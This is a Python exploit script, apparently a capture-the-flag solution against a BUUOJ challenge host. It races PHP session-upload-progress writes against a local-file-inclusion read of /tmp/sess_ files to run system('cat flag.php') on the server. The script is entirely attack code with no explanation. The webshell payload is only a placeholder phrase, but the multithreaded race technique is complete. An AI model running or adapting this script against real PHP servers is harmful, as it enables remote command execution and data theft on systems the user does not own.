import io
import requests
import threading
sessid = 'bbbbbbb'
data = {"cmd":"system('cat flag.php');"}
def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post( 'http://4e1e87d9-67a6-4a57-9594-407d57b02aa6.node4.buuoj.cn:81/', data={'PHP_SESSION_UPLOAD_PROGRESS': '一句话木马'}, files={'file': ('1.txt',f)}, cookies={'PHPSESSID': sessid} )
def read(session):
    while True:
        resp = session.post('http://4e1e87d9-67a6-4a57-9594-407d57b02aa6.node4.buuoj.cn:81/?file=/tmp/sess_'+sessid,data=data)
        if '1.txt' in resp.text:
            print(resp.text)
            event.clear()
        else:
            print("[+++++++++++++]retry")
if __name__=="__main__":
    event=threading.Event()
    with requests.session() as session:
        for i in range(1,30):
            threading.Thread(target=write,args=(session,)).start()

        for i in range(1,30):
            threading.Thread(target=read,args=(session,)).start()
    event.set()

